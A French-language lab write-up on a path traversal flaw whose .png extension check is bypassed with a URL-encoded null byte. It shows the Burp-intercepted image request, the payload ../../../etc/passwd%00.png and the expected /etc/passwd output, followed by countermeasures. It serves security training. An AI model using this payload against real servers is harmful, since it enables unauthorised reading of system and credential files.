
# 🧪 Lab 5 - File Path Traversal: Validation de l’Extension contournée avec Null Byte (%00)

---

## 🔍 Description du Lab

Ce lab illustre une vulnérabilité **Path Traversal** combinée à une mauvaise validation de **l’extension de fichier**.  
L’application exige que le nom de fichier se termine par `.png`, mais elle **valide l’extension avant** d’utiliser la valeur, ce qui permet un **contournement via un byte nul (`%00`)**.

---

## 🎯 Objectif

Exploiter la faille pour lire le contenu du fichier système :
```

/etc/passwd

```

---

## 🛠️ Outils utilisés

- ⚔️ **Burp Suite**
- 🧠 Connaissances des encodages (`%00`, null byte)
- 🌐 Navigateur Web avec proxy configuré

---

## 🚦 Étapes d’exploitation

### 1. Intercepter une requête d’image

- Intercepte une requête du type :
```

GET /image?filename=product1.png

```

### 2. Analyser la protection

- L’application vérifie que `filename` se termine par `.png`
- Mais elle **utilise la valeur directement** ensuite, sans revalider

### 3. Injecter un **chemin malicieux** avec un **null byte**

- Remplace `filename` par :
```

../../../etc/passwd%00.png

```

- `%00` représente le **byte nul**, souvent interprété comme **fin de chaîne** par certains langages (ex: C, anciens parseurs PHP...).

### 4. Résultat

L’application pense traiter :
```

filename = "../../../etc/passwd%00.png" → se termine par .png ✅

```

Mais le serveur lit réellement :
```

../../../etc/passwd

```

---

## ✅ Vérification

Tu dois voir en réponse :
```

root\:x:0:0\:root:/root:/bin/bash
daemon\:x:1:1\:daemon:/usr/sbin:/usr/sbin/nologin
...

```

---

## 📸 Capture d’écran (à ajouter)

Ajoute ici une capture Burp Suite avec la requête exploitée et la réponse réussie.

![Path-Traversal](https://github.com/Kabilala/path-traversal/blob/main/lab6/lab6.png)

---

## 🛡️ Contremesures recommandées

- ✅ Toujours **valider le chemin complet et l’extension après décodage**
- 🧼 **Neutraliser les bytes nuls** (null byte) dans les paramètres utilisateur
- 📦 N’autoriser que des fichiers prédéfinis via une **liste blanche**
- 🔍 Effectuer une validation **côté serveur**, pas juste dans la logique applicative

---

## 🎓 Concepts clés

| Terme             | Description |
|------------------|-------------|
| `%00`            | Null byte en encodage URL |
| Validation naïve | Vérifie l’extension sans analyser la partie avant `%00` |
| Bypass d’extension | Permet de tromper la vérification par suffixe `.png` |

---